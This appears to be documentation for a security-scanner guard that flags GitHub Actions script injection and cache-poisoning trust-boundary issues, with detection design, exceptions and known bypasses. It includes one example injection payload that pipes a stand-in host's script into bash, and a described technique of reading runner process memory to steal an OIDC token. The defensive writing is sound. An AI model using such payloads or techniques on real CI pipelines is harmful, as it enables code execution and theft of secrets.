---
type: Guard
title: "actions-script-injection"
description: "No untrusted GitHub-context interpolation in run: steps."
timestamp: "2026-10-20T00:00:00Z"
guard_id: "actions-script-injection"
checklist_section: ["1"]
standards: ["OWASP-LLM:LLM03", "OWASP:A03", "OWASP:A08"]
---

# No untrusted GitHub-context interpolation in run: steps

Flags an untrusted GitHub expansion context (`${{ github.event.* }}` / `${{ github.head_ref }}`)
interpolated inside a `run:` shell block. Closes checklist item `1-actions-script-injection`.
Complements `actions-sha-pin` (the other §1 supply-chain guard).

## The threat

GitHub expands `${{ ... }}` *before* the shell runs, so `run: echo "${{ github.event.pull_request.title }}"`
with the title `"; curl evil.sh | bash #` executes the attacker's command in CI — with the
repository's `GITHUB_TOKEN` and secrets. Anyone who can open a PR (any fork) controls these contexts.
The fix is to pass the value through `env:` and reference the *quoted* variable in the script, where
it is data, not code. CWE-74 (Injection), OWASP A03, OWASP-LLM:LLM03 (supply chain).

## Exploitability rationale

HIGH. Reachable by any external contributor via a PR; impact is CI code execution + secret theft.
Scored high rather than critical because it requires the workflow to run on a fork-PR trigger with the
vulnerable step — a real but bounded precondition.

## When NOT to flag (and the pragma)

- **`env:` indirection** — the untrusted context is assigned to an `env:` var and the script uses
  `"$VAR"` → silent (this is the recommended fix; the interpolation is not in a `run:` block).
- **Trusted contexts** — `github.sha`, `github.run_id`, `github.ref` (non-PR) → not in the untrusted
  set, silent.
- An audited case → `# security: allow-actions-interpolation` on the line, counted only as a real `#` comment (the `hash` comment view, so the phrase inside a quoted string does not count, #1040). The `hash` view and
  not the `yaml` one, because the flagged line is a shell line: the `yaml` view reads a `run: |` script as
  scalar content, so a shell comment there would stop counting.
- **Workflow-file subdirectories** — only files placed DIRECTLY in `.github/workflows/` are scanned.
  GitHub never executes a workflow in a subdirectory (`backup/`, `disabled/`, `templates/`,
  `_archive/`), so an interpolation there is not exploitable and is not flagged (round-2 §C.1: one
  such archived tree produced 29 false positives).

## Known bypasses (honest limits)

- Only the high-signal untrusted contexts are matched (`github.event.*`, `github.head_ref`). A rarer
  injectable context (e.g. a custom action output derived from PR data) is not seen.
- The `run:`-block detection is indentation-based; a heavily reformatted workflow could slip a
  multi-line block past the dedent heuristic.

## What this guard does NOT prove

It flags interpolation in a `run:` step; it does not prove the workflow trigger exposes it to
untrusted PRs, nor audit composite-action internals. Absence of a finding ≠ the pipeline is injection-free.

---

## A second, unrelated pattern class: cache poisoning (NS-13, added 2026-08-28)

**The threat.** GitHub Actions **cache poisoning**, the "Pwn Request" chain that root-caused the
2026 **TanStack** npm supply-chain compromise (84 malicious `@tanstack/*` package versions
published, OIDC token extracted from runner memory). A pull-request-reachable job WRITES to a
shared cache — `actions/cache`, or a setup-* action's own `cache:` input (`actions/setup-node`/
`-python`/`-go`/`-java`, `pnpm/action-setup`) — and a SEPARATELY-privileged job, one with
`id-token: write` (the OIDC-publish signal), also uses caching. A crafted PR poisons the shared
cache; when the privileged job later restores it, the poisoned content executes with publish
credentials. TanStack's real incident: a PR-triggered bundle-size workflow checked out
`refs/pull/<n>/merge` (the "Pwn Request" checkout half — see `ci-secret-env-unscoped.md`'s
`pull-request-target-fork-checkout` rule for that pattern on its own) and poisoned a shared pnpm
cache; the release pipeline later restored that cache, and the malicious code extracted an OIDC
JWT by reading `/proc/<pid>/maps`/`/proc/<pid>/mem` of the runner process, then published directly
to npm.

Neither existing rule in this guard file family sees this: this module's own `run:`-interpolation
check is scoped to `${{ }}` expressions inside shell blocks; `js_supply_chain.py` never touches
workflow YAML at all.

**Why this is a repo-wide correlation, not a single-file check.** The real incident spanned TWO
SEPARATE workflow files (a PR-triggered build workflow, a tag-triggered release workflow) — a
same-file-only heuristic would have missed the actual precedent entirely. This guard aggregates
fork-reachable cache writers and privileged (`id-token: write`) cache users across EVERY file in
`.github/workflows/` before correlating, the same cross-file aggregation philosophy
`definer_function_grants.py` already uses for its GRANT/REVOKE pairing (a definer function often
created in one migration file and revoked in a later one).

**Severity: CRITICAL** — full repo-write + publish-credential compromise, a strictly worse outcome
than either sibling rule in this file (interpolation: CI code execution; this: supply-chain
publish compromise).

### Detection design

`_job_slices(text)` — a locally-duplicated copy of `ci_secret_env_unscoped.py`'s job-slicing
regex (small and self-contained enough that duplicating it beat introducing a cross-guard import
for a guard file with no existing job-aware infrastructure of its own). `_pr_reachable(text)`
checks the `on:` block for bare `pull_request` OR `pull_request_target` (broader than
`ci-secret-env-unscoped.py`'s bare-`pull_request`-only check, since either trigger can carry
fork-influenced job content that writes to a cache). `_job_uses_caching(job_slice)` is true for a
direct `actions/cache[/save|/restore]@` reference, or a setup-* action reference PLUS a `cache:`
key anywhere in that job's slice.

`_cache_trust_boundary()` runs as an ADDITIONAL pass in `run()` (not folded into the existing
per-line `_scan()`): for every workflow file not carrying the `allow-ci-cache-trust-boundary`
pragma, it walks every job via `_job_slices`, classifying each as a "writer" (PR-reachable +
caching) and/or "privileged" (`id-token: write` — checked at the job level AND the workflow-level
`permissions:` block that precedes `jobs:`, since a top-level block applies to every job — +
caching). If BOTH lists are non-empty anywhere in the repo, it emits ONE finding per privileged
job, citing up to 3 of the writer jobs by `file:job` as the poisoning vector — this avoids a
combinatorial explosion of findings while staying precise about WHERE the exposure actually is.

Rule: `actions-script-injection/cache-trust-boundary`. Standards: `["OWASP:A08",
"OWASP-LLM:LLM03"]` (Software/Data Integrity Failures + Supply Chain).

### When NOT to flag (cache-trust-boundary rule)

- **No privileged (`id-token: write`) job uses caching at all** — a PR-reachable cache writer with
  nothing downstream to poison is not this rule's target.
- **No PR-reachable job writes to a cache** — a privileged, caching job with no fork-influenced
  writer anywhere in the repo has nothing poisoning it.
- **A setup-* action with no `cache:` input** — `actions/setup-node` etc. only touch the Actions
  cache when explicitly configured to; presence of the action alone is not enough.
- **File-level pragma** — `# security: allow-ci-cache-trust-boundary` anywhere in a file excludes
  that file from BOTH the writer and privileged classification. It counts only as a `#` comment, a shell
  comment in a `run: |` script included (the `hash` view); the phrase in a quoted scalar does not (#1040).

### Known bypasses (cache-trust-boundary rule)

- **Cache-key scoping is not modeled** — a repo that already namespaces cache keys by
  branch/actor (the actual, correct fix) is still flagged; the guard has no way to tell a properly
  isolated cache key from a shared one, since key expressions can reference arbitrary context.
  This is a real, structural false-positive risk on a repo that has already done the right thing —
  disclosed here rather than silently narrowed, since under-detecting the actual TanStack shape
  (two files, no key scoping) is the worse failure mode for a NEW pattern class like this one.
- **`id-token: write` via a reusable/composite workflow's own `permissions:`** is not seen; only
  the calling file's own top-level and job-level blocks are read.
- **A non-standard caching mechanism** (a custom action that shells out to a cloud cache/CDN
  directly, rather than `actions/cache` or a setup-* action's built-in cache) is invisible.
- **No canary demonstration** — repo-wide correlation across every `.github/workflows/` file,
  and the shared `ci.yml` canary base file several guards trip on; adding caching + `id-token:
  write` signals there risks tripping other guards (e.g. `actions-sha-pin` on an unpinned
  setup-* action) unexpectedly on a file this guard doesn't own. Coverage is the 6 dedicated unit
  tests above.

# Citations

[1] agentsec checklist item `1-actions-script-injection` (§1)
[2] OWASP-LLM:LLM03
[3] OWASP:A03
